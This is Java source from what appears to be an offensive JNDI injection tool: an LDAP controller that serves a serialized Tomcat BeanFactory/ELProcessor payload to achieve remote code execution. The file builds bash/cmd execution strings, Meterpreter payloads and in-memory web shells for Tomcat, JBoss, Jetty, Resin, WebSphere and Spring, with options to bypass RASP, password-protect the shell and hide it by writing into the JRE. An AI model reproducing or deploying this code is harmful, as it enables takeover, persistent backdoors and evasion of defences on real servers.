package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.utils.InjShell;
import com.nu1r.jndi.template.Agent.WinMenshell;
import com.nu1r.jndi.template.Meterpreter;
import com.nu1r.jndi.template.SpringEchoTemplate;
import com.nu1r.jndi.template.TomcatEchoTemplate;
import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
import com.nu1r.jndi.template.isSuccess;
import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
import com.nu1r.jndi.template.jboss.JbossEcho;
import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
import com.nu1r.jndi.template.resin.RFMSFromThreadF;
import com.nu1r.jndi.template.resin.RSMSFromThreadS;
import com.nu1r.jndi.template.spring.SpringControllerMS;
import com.nu1r.jndi.template.spring.SpringInterceptorMS;
import com.nu1r.jndi.template.struts2.Struts2ActionMS;
import com.nu1r.jndi.template.tomcat.*;
import com.nu1r.jndi.gadgets.Config.Config;
import com.nu1r.jndi.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import org.apache.commons.codec.binary.Base64;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import java.io.IOException;

import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
import static com.nu1r.jndi.gadgets.utils.HexUtils.generatePassword;
import static com.nu1r.jndi.gadgets.Config.Config.*;
import static com.nu1r.jndi.gadgets.utils.InjShell.*;
import static org.fusesource.jansi.Ansi.ansi;


@LdapMapping(uri = {"/tomcatbypass"})
public class TomcatBypassController implements LdapController {
    private PayloadType payloadType;
    private String[]    params;
    private GadgetType  gadgetType;

    public static CommandLine cmdLine;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+]|@  Sending LDAP ResourceRef result for" + base + "  with javax.el.ELProcessor payload"));
            Entry e = new Entry(base);
            e.addAttribute("javaClassName", "java.lang.String"); //could be any
            //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));

            TomcatBypassHelper helper = new TomcatBypassHelper();
            String             code   = null;


            //具体分化在这里
            switch (payloadType) {
                case nu1r:
                    code = helper.getExecCode(params[0]);
                    break;
                case tomcatecho:
                    code = helper.injectTomcatEcho();
                    break;
                case springecho:
                    code = helper.injectSpringEcho();
                    break;
                case issuccess:
                    code = helper.injectSuccess();
                    break;
                case meterpreter:
                    code = helper.injectMeterpreter();
                    break;
                case tomcatfilterjmx:
                    code = helper.injectTomcatFilterJmx();
                    break;
                case tomcatfilterth:
                    code = helper.injectTomcatFilterTh();
                    break;
                case tomcatlistenerjmx:
                    code = helper.injectTomcatListenerJmx();
                    break;
                case tomcatlistenerth:
                    code = helper.injectTomcatListenerTh();
                    break;
                case tomcatservletjmx:
                    code = helper.injectTomcatServletJmx();
                    break;
                case tomcatservletth:
                    code = helper.injectTomcatServletTh();
                    break;
                case jbossfilter:
                    code = helper.injectJBossFilter();
                    break;
                case jbossservlet:
                    code = helper.injectJBossServlet();
                    break;
                case springinterceptor:
                    code = helper.injectSpringInterceptor();
                    break;
                case springcontroller:
                    code = helper.injectSpringControllerMS();
                    break;
                case wsfilter:
                    code = helper.injectWSFilter();
                    break;
                case jettyfilter:
                    code = helper.injectJettyFilter();
                    break;
                case jettyservlet:
                    code = helper.injectJettyServlet();
                    break;
                case tomcatexecutor:
                    code = helper.injectTomcatExecutor();
                    break;
                case resinfilterth:
                    code = helper.injectResinFilterTh();
                    break;
                case resinservletth:
                    code = helper.injectResinServletTh();
                    break;
                case tomcatupgrade:
                    code = helper.injectTomcatUpgrade();
                    break;
                case jbossecho:
                    code = helper.injectJbossEcho();
            }

            String payloadTemplate = "{" +
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"{replacement}\")" +
                    "}";
            String finalPayload = payloadTemplate.replace("{replacement}", code);
            ref.add(new StringRefAddr("x", finalPayload));
            e.addAttribute("javaSerializedData", Util.serialize(ref));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            System.out.println();
        }catch (Throwable er){
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@  PaylaodType >> " + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.shell) {
                String   arg     = Util.getCmdFromBase(base);
                String[] args    = arg.split(" ");
                Options  options = new Options();
                options.addOption("t", "Type", false, "选择内存马的类型");
                options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                options.addOption("o", "obscure", false, "使用反射绕过");
                options.addOption("w", "winAgent", false, "Windows下使用Agent写入");
                options.addOption("l", "linAgent", false, "Linux下使用Agent写入");
                options.addOption("u", "url", true, "内存马绑定的路径,default [/version.txt]");
                options.addOption("pw", "password", true, "内存马的密码,default [p@ssw0rd]");
                options.addOption("r", "referer", true, "内存马 Referer check,default [https://nu1r.cn/]");
                options.addOption("h", "hide-mem-shell", false, "通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持SpringControllerMS");
                options.addOption("ht", "hide-type", true, "隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/");

                CommandLineParser parser = new DefaultParser();

                try {
                    cmdLine = parser.parse(options, args);
                } catch (Exception e) {
                    System.out.println("[*] Parameter input error, please use -h for more information");
                }

                if (cmdLine.hasOption("Type")) {
                    Shell_Type = cmdLine.getOptionValue("Type");
                    //System.out.println("内存shell >>" + Shell_Type);
                }

                if (cmdLine.hasOption("winAgent")) {
                    winAgent = true;
                    System.out.println(ansi().render("@|green [+]|@Windows下使用Agent写入"));
                }

                if (cmdLine.hasOption("linAgent")) {
                    winAgent = true;
                    System.out.println(ansi().render("@|green [+]|@Linux下使用Agent写入"));
                }

                if (cmdLine.hasOption("obscure")) {
                    IS_OBSCURE = true;
                    System.out.println(ansi().render("@|green [+]|@使用反射绕过RASP"));
                }

                if (cmdLine.hasOption("url")) {
                    String url = cmdLine.getOptionValue("url");
                    if (!url.startsWith("/")) {
                        url = "/" + url;
                    }
                    URL_PATTERN = url;
                    System.out.println("[+] Path：" + URL_PATTERN);
                }

                if (cmdLine.hasOption("password")) {
                    PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
                    System.out.println("[+] Password：" + PASSWORD);
                }

                if (cmdLine.hasOption("referer")) {
                    HEADER_KEY = cmdLine.getOptionValue("referer");
                    System.out.println("[+] referer：" + HEADER_KEY);
                }

                if (cmdLine.hasOption("AbstractTranslet")) {
                    IS_INHERIT_ABSTRACT_TRANSLET = true;
                    System.out.println("[+] 继承恶意类AbstractTranslet");
                }

                if (cmdLine.hasOption("hide-mem-shell")) {
                    HIDE_MEMORY_SHELL = true;

                    if (cmdLine.hasOption("hide-type")) {
                        HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
                    }
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+]|@ Command >>" + cmd));
                params = new String[]{cmd};
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper {

        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String injectTomcatEcho() {
            return injectClass(TomcatEchoTemplate.class);
        }

        public String injectJbossEcho() {
            return injectClass(JbossEcho.class);
        }

        public String injectSpringEcho() {
            return injectClass(SpringEchoTemplate.class);
        }

        public String injectSuccess() {
            return injectClass(isSuccess.class);
        }

        //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
        public String injectMeterpreter() {
            System.out.println("------------------------");
            return injectClass(Meterpreter.class);
        }

        public String injectTomcatFilterJmx() throws Exception {
            return structureShellTom(TFJMX.class);
        }

        public String injectTomcatFilterTh() throws Exception {
            return structureShellTom(TFMSFromThreadF.class);
        }

        public String injectTomcatListenerJmx() throws Exception {
            return structureShellTom(TLMSFromJMXLi.class);
        }

        public String injectTomcatListenerTh() throws Exception {
            return structureShellTom(TLMSFromThreadLi.class);
        }

        public String injectTomcatServletJmx() throws Exception {
            return structureShellTom(TSMSFromJMXS.class);
        }

        public String injectTomcatServletTh() throws Exception {
            return structureShellTom(TSMSFromThreadS.class);
        }

        public String injectJBossFilter() throws Exception {
            return structureShellTom(JBFMSFromContextF.class);
        }

        public String injectJBossServlet() throws Exception {
            return structureShellTom(JBSMSFromContextS.class);
        }

        public String injectJettyFilter() throws Exception {
            return structureShellTom(JFMSFromJMXF.class);
        }

        public String injectJettyServlet() throws Exception {
            return structureShellTom(JSMSFromJMXS.class);
        }

        public String injectWSFilter() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
            CtClass ctClass = pool.get(WSFMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (HIDE_MEMORY_SHELL) {
                switch (HIDE_MEMORY_SHELL_TYPE) {
                    case 1:
                        break;
                    case 2:
                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                        newClass.setName(generateClassName());
                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                        String className = "className=\"" + ctClass.getName() + "\";";
                        newClass.defrost();
                        newClass.makeClassInitializer().insertBefore(content);
                        newClass.makeClassInitializer().insertBefore(className);

                        if (IS_INHERIT_ABSTRACT_TRANSLET) {
                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                            CtClass superClass = pool.get(abstTranslet.getName());
                            newClass.setSuperclass(superClass);
                        }

                        return injectClass(newClass.getClass());
                }
            }
            
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatExecutor() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
            CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (HIDE_MEMORY_SHELL) {
                switch (HIDE_MEMORY_SHELL_TYPE) {
                    case 1:
                        break;
                    case 2:
                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                        newClass.setName(generateClassName());
                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                        String className = "className=\"" + ctClass.getName() + "\";";
                        newClass.defrost();
                        newClass.makeClassInitializer().insertBefore(content);
                        newClass.makeClassInitializer().insertBefore(className);

                        if (IS_INHERIT_ABSTRACT_TRANSLET) {
                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                            CtClass superClass = pool.get(abstTranslet.getName());
                            newClass.setSuperclass(superClass);
                        }

                        return injectClass(newClass.getClass());
                }
            }
            
            return injectClass(ctClass.getClass());
        }

        public String injectSpringInterceptor() throws Exception {
            return structureShellTom(SpringInterceptorMS.class);
        }

        public String injectSpringControllerMS() throws Exception {
            return structureShellTom(SpringControllerMS.class);
        }

        public String injectResinFilterTh() throws Exception {
            return structureShellTom(RFMSFromThreadF.class);
        }

        public String injectResinServletTh() throws Exception {
            return structureShellTom(RSMSFromThreadS.class);
        }

        public String injectTomcatUpgrade() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
            CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (HIDE_MEMORY_SHELL) {
                switch (HIDE_MEMORY_SHELL_TYPE) {
                    case 1:
                        break;
                    case 2:
                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                        newClass.setName(generateClassName());
                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                        String className = "className=\"" + ctClass.getName() + "\";";
                        newClass.defrost();
                        newClass.makeClassInitializer().insertBefore(content);
                        newClass.makeClassInitializer().insertBefore(className);

                        if (IS_INHERIT_ABSTRACT_TRANSLET) {
                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                            CtClass superClass = pool.get(abstTranslet.getName());
                            newClass.setSuperclass(superClass);
                        }

                        return injectClass(newClass.getClass());
                }
            }
            return injectClass(ctClass.getClass());
        }
    }
}